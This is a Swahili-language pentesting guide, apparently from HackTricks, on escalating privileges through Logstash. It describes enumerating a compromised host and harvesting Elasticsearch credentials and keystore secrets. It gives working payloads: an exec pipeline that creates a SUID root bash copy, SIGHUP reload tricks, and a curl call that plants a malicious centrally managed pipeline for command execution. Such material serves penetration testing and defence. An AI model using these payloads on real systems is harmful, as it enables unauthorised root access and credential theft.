# Logstash Privilege Escalation

## Logstash

Logstash hutumika **kukusanya, kubadilisha, na kusambaza logs** kupitia mfumo unaojulikana kama **pipelines**. Pipelines hizi zinaundwa na hatua za **input**, **filter**, na **output**.<sup>[[4]](#references)</sup> Kipengele cha kuvutia hujitokeza Logstash inapofanya kazi kwenye mashine iliyoathiriwa.

### Pipeline Configuration

Kwenye usakinishaji wa packages za Debian na RPM, pipelines husanidiwa kupitia **/etc/logstash/pipelines.yml**, ambayo huorodhesha mahali zilipo pipeline configurations; distributions nyingine huweka `pipelines.yml` kwenye directory ya Logstash `path.settings`.<sup>[[5]](#references)[[6]](#references)</sup>
```yaml
# Define your pipelines here. Multiple pipelines can be defined.
# For details on multiple pipelines, refer to the documentation:
# https://www.elastic.co/guide/en/logstash/current/multiple-pipelines.html

- pipeline.id: main
path.config: "/etc/logstash/conf.d/*.conf"
- pipeline.id: example
path.config: "/usr/share/logstash/pipeline/1*.conf"
pipeline.workers: 6
```
Faili hii inaonyesha mahali zilipo faili za **.conf** zenye mipangilio ya pipeline. Unapotumia **Elasticsearch output**, kagua mipangilio yake ya `user`/`password`, `cloud_auth`, au `api_key`; privileges halisi ya account hutegemea Elasticsearch. Glob ya `path.config` hupakia kila faili linalolingana kwa pipeline hiyo.<sup>[[6]](#references)[[7]](#references)[[11]](#references)</sup>

Ikiwa Logstash imeanzishwa kwa `-f <directory>` badala ya `pipelines.yml`, `-f` hutangulizwa na **faili zote zilizo ndani ya directory hiyo huunganishwa kwa mpangilio wa lexicographical na kuchanganuliwa kama config moja**.<sup>[[6]](#references)[[7]](#references)</sup> Hii inaleta athari 2 za offensive:

- Faili lililowekwa kama `000-input.conf` au `zzz-output.conf` linaweza kubadilisha jinsi pipeline ya mwisho inavyoundwa
- Faili lenye makosa linaweza kufanya config iliyounganishwa ishindwe validation; wakati wa reload, Logstash huhifadhi pipeline ya awali, kwa hiyo validate payloads kabla ya kutegemea auto-reload.<sup>[[1]](#references)</sup>

### Enumeration ya Haraka kwenye Host Iliyoathiriwa

Kwenye box ambayo Logstash imewekwa, kagua kwa haraka:
```bash
ps aux | grep -i logstash
systemctl cat logstash 2>/dev/null
cat /etc/logstash/pipelines.yml 2>/dev/null
cat /etc/logstash/logstash.yml 2>/dev/null
find /etc/logstash /usr/share/logstash -maxdepth 3 -type f \( -name '*.conf' -o -name 'logstash.yml' -o -name 'pipelines.yml' \) -ls
rg -n --hidden -S 'password|passwd|api[_-]?key|cloud_auth|ssl_keystore_password|truststore_password|user\s*=>|hosts\s*=>' /etc/logstash /usr/share/logstash 2>/dev/null
```
Pia angalia kama API ya ufuatiliaji ya ndani inafikika. Kwa chaguo-msingi hufungamana na **127.0.0.1:9600**, ambayo kwa kawaida inatosha baada ya kupata ufikiaji kwenye host.<sup>[[8]](#references)</sup>
```bash
curl -s http://127.0.0.1:9600/?pretty
curl -s http://127.0.0.1:9600/_node/pipelines?pretty
curl -s http://127.0.0.1:9600/_node/stats/pipelines?pretty
```
Vituo hivi vinaonyesha pipeline IDs na mipangilio, metrics za wakati wa utekelezaji, na vihesabu vya mafanikio/kushindwa kwa config-reload, hivyo kusaidia kuthibitisha ikiwa mabadiliko yamekubaliwa.<sup>[[8]](#references)[[17]](#references)[[18]](#references)</sup>

Ikiwa credential iliyopatikana inalenga **Elasticsearch**, angalia [ukurasa huu mwingine kuhusu Elasticsearch](../../network-services-pentesting/9200-pentesting-elasticsearch.md).

### Privilege Escalation kupitia Pipelines Zinazoweza Kuandikwa

Ili kujaribu privilege escalation, kwanza tambua user ambaye service ya Logstash inaendeshwa chini yake; usidhani kuwa ni root au user wa **logstash**. Hakikisha unatimiza **moja** ya vigezo hivi:

- Una **write access** kwenye faili ya pipeline **.conf** **au**
- Faili ya **/etc/logstash/pipelines.yml** inatumia wildcard, na unaweza kuandika kwenye folder inayolengwa.<sup>[[6]](#references)[[7]](#references)</sup>

Zaidi ya hayo, **moja** ya masharti haya lazima itimizwe:

- Uwezo wa ku-restart service ya Logstash **au**
- Faili ya **/etc/logstash/logstash.yml** imewekwa **config.reload.automatic: true**.<sup>[[1]](#references)[[15]](#references)</sup>

Ikiwa kuna wildcard kwenye configuration, kuunda faili inayolingana na wildcard hiyo kunaruhusu command execution.<sup>[[7]](#references)[[9]](#references)</sup> Kwa mfano:
```bash
input {
exec {
command => "whoami"
interval => 120
}
}

output {
file {
path => "/tmp/output.log"
codec => rubydebug
}
}
```
Hapa, **interval** huamua mara kwa mara ya utekelezaji kwa sekunde. Katika mfano uliotolewa, amri ya **whoami** huendeshwa kila baada ya sekunde 120, huku matokeo yake yakielekezwa kwenye **/tmp/output.log**.<sup>[[9]](#references)</sup>

Kwa **config.reload.automatic: true** katika **/etc/logstash/logstash.yml**, Logstash itagundua na kutumia kiotomatiki usanidi mpya au uliorekebishwa wa pipeline bila kuhitaji restart.<sup>[[1]](#references)[[15]](#references)</sup> Ikiwa hakuna wildcard, marekebisho bado yanaweza kufanywa kwenye usanidi uliopo, lakini tahadhari inashauriwa ili kuepuka usumbufu.

### Payloads za Pipeline Zinazoaminika Zaidi

Plugin ya input ya `exec` bado inafanya kazi katika matoleo ya sasa na inahitaji ama `interval` au `schedule`. Hutekeleza kwa **forking** JVM ya Logstash, kwa hivyo ikiwa memory ni chache, payload yako inaweza kushindwa kwa `ENOMEM` badala ya kuendelea kufanya kazi bila kutoa taarifa.<sup>[[9]](#references)</sup>

Wakati service ina privileges za kutosha kuunda faili ya SUID inayomilikiwa na root, payload ya vitendo ya privilege-escalation ni ile inayoacha artifact ya kudumu:
```bash
input {
exec {
command => "cp /bin/bash /tmp/logroot && chown root:root /tmp/logroot && chmod 4755 /tmp/logroot"
interval => 300
}
}
output {
null {}
}
```
Ikiwa huna ruhusa za kuanzisha upya lakini unaweza kutuma signal kwa process, Logstash pia inasaidia reload inayochochewa na **SIGHUP** kwenye mifumo kama Unix:<sup>[[1]](#references)</sup>
```bash
kill -SIGHUP $(pgrep -f logstash)
```
Jihadhari kwamba si kila plugin inaweza kufanya reload kwa urahisi. Kwa mfano, input ya **stdin** huzuia reload ya kiotomatiki, kwa hiyo usidhani kwamba `config.reload.automatic` itatumia mabadiliko yako kila wakati.<sup>[[1]](#references)</sup>

### Kuiba Siri kutoka Logstash

Kabla ya kulenga utekelezaji wa code pekee, kusanya data ambayo Logstash tayari inaweza kufikia:

- Credentials zinaweza kuonekana katika outputs za `elasticsearch {}`, URLs/settings za `http_poller`, inputs za JDBC, au settings zinazohusiana na cloud; plugins hizi zinaonyesha sehemu za credentials zinazofaa kutafutwa.<sup>[[11]](#references)[[12]](#references)[[13]](#references)</sup>
- Settings salama zinaweza kuwa katika **`/etc/logstash/logstash.keystore`** au saraka nyingine ya `path.settings`.<sup>[[5]](#references)[[10]](#references)</sup>
- Password ya keystore inaweza kutolewa kupitia **`LOGSTASH_KEYSTORE_PASS`**, na installs za RPM/DEB hupakia service environment variables kutoka **`/etc/sysconfig/logstash`**.<sup>[[10]](#references)</sup>
- Upanuzi wa environment variable kwa `${VAR}` hutatuliwa Logstash inapoanza, kwa hiyo environment ya service inafaa kukaguliwa.<sup>[[14]](#references)</sup>

Ukaguzi muhimu:
```bash
ls -l /etc/logstash /etc/logstash/logstash.keystore 2>/dev/null
strings /etc/logstash/conf.d/*.conf 2>/dev/null | head
tr '\0' '\n' < /proc/$(pgrep -o -f logstash)/environ 2>/dev/null | sort
cat /etc/sysconfig/logstash 2>/dev/null
journalctl -u logstash --no-pager 2>/dev/null | tail -n 200
ls -lah /var/log/logstash 2>/dev/null
```
Hili pia linafaa kuchunguzwa kwa sababu **CVE-2023-46672** ilionyesha kuwa, chini ya hali maalum, Logstash ilihifadhi taarifa nyeti kwenye logs zake, ikiwemo secrets zilizohifadhiwa kwenye keystore yake na kurejelewa kutoka kwenye configuration; kagua logs za zamani za Logstash na entries za `journald` ikiwa hali hizo zinaweza kutumika.<sup>[[3]](#references)</sup>

### Matumizi Mabaya ya Usimamizi wa Pipeline wa Kati

Katika baadhi ya mazingira, host **haitegemei** kabisa faili za ndani za `.conf`. Ikiwa **`xpack.management.enabled: true`** imesanidiwa, Logstash inaweza kuvuta pipelines zinazosimamiwa centrally kutoka Elasticsearch/Kibana, na baada ya kuwezesha hali hii, local pipeline configs si chanzo tena cha ukweli.<sup>[[2]](#references)</sup>

Hii inamaanisha kuna attack path tofauti:

1. Rejesha Elastic credentials kutoka kwenye local Logstash settings, keystore, au logs.<sup>[[3]](#references)[[10]](#references)</sup>
2. Thibitisha ikiwa account ina cluster privilege ya **`manage_logstash_pipelines`**.<sup>[[16]](#references)</sup>
3. Unda au badilisha centrally managed pipeline ili Logstash host itekeleze payload yako kwenye poll interval inayofuata.<sup>[[2]](#references)[[16]](#references)</sup>

Elasticsearch API inayotumika kwa feature hii ni:<sup>[[16]](#references)</sup>
```bash
curl -X PUT http://ELASTIC:9200/_logstash/pipeline/pwned \
-H 'Content-Type: application/json' \
-u user:password \
-d '{
"description": "malicious pipeline",
"last_modified": "2026-01-02T02:50:51.250Z",
"username": "user",
"pipeline": "input { exec { command => \"id > /tmp/.ls-rce\" interval => 120 } } output { null {} }",
"pipeline_metadata": {"type": "logstash_pipeline", "version": "1"},
"pipeline_settings": {
"pipeline.workers": 1,
"pipeline.batch.size": 1,
"pipeline.batch.delay": 50,
"queue.type": "memory",
"queue.max_bytes": "1gb",
"queue.checkpoint.writes": 1024
}
}'
```
Hii ni muhimu hasa wakati faili za ndani ziko read-only lakini Logstash tayari imesajiliwa kuchukua pipelines kwa mbali.<sup>[[2]](#references)[[16]](#references)</sup>

## References

- [1] [Elastic Docs: Kupakia upya Faili ya Usanidi](https://www.elastic.co/guide/en/logstash/8.19/reloading-config.html)
- [2] [Elastic Docs: Kusanidi Usimamizi wa Centralized Pipelines](https://www.elastic.co/guide/en/logstash/8.19/configuring-centralized-pipelines.html)
- [3] [Logstash 8.11.1 Security Update (ESA-2023-26) - CVE-2023-46672](https://discuss.elastic.co/t/logstash-8-11-1-security-update-esa-2023-26/347191)
- [4] [Elastic Docs: Kuunda Logstash Pipeline](https://www.elastic.co/docs/reference/logstash/creating-logstash-pipeline)
- [5] [Elastic Docs: Muundo wa Saraka ya Logstash](https://www.elastic.co/docs/reference/logstash/dir-layout)
- [6] [Elastic Docs: Pipelines Nyingi](https://www.elastic.co/docs/reference/logstash/multiple-pipelines)
- [7] [Elastic Docs: Kuendesha Logstash kutoka kwenye Command Line](https://www.elastic.co/docs/reference/logstash/running-logstash-command-line)
- [8] [Elastic Docs: Kufuatilia Logstash kwa kutumia APIs](https://www.elastic.co/docs/reference/logstash/monitoring-logstash)
- [9] [Elastic Docs: Exec input plugin](https://www.elastic.co/docs/reference/logstash/plugins/plugins-inputs-exec)
- [10] [Elastic Docs: Secrets keystore kwa mipangilio salama](https://www.elastic.co/docs/reference/logstash/keystore)
- [11] [Elastic Docs: Elasticsearch output plugin](https://www.elastic.co/docs/reference/logstash/plugins/plugins-outputs-elasticsearch)
- [12] [Elastic Docs: Http_poller input plugin](https://www.elastic.co/docs/reference/logstash/plugins/plugins-inputs-http_poller)
- [13] [Elastic Docs: Jdbc input plugin](https://www.elastic.co/docs/reference/logstash/plugins/plugins-inputs-jdbc)
- [14] [Elastic Docs: Kutumia environment variables](https://www.elastic.co/docs/reference/logstash/environment-variables)
- [15] [Elastic Docs: logstash.yml](https://www.elastic.co/docs/reference/logstash/logstash-settings-file)
- [16] [Elasticsearch API: Kuunda au kusasisha Logstash pipeline](https://www.elastic.co/docs/api/doc/elasticsearch/operation/operation-logstash-put-pipeline)
- [17] [Logstash API: Kupata mipangilio ya pipelines](https://www.elastic.co/docs/api/doc/logstash/operation/operation-nodeinfopipelines)
- [18] [Logstash API: Kupata takwimu za pipelines](https://www.elastic.co/docs/api/doc/logstash/operation/operation-nodestatspipelines)
{{#include ../../banners/hacktricks-training.md}}
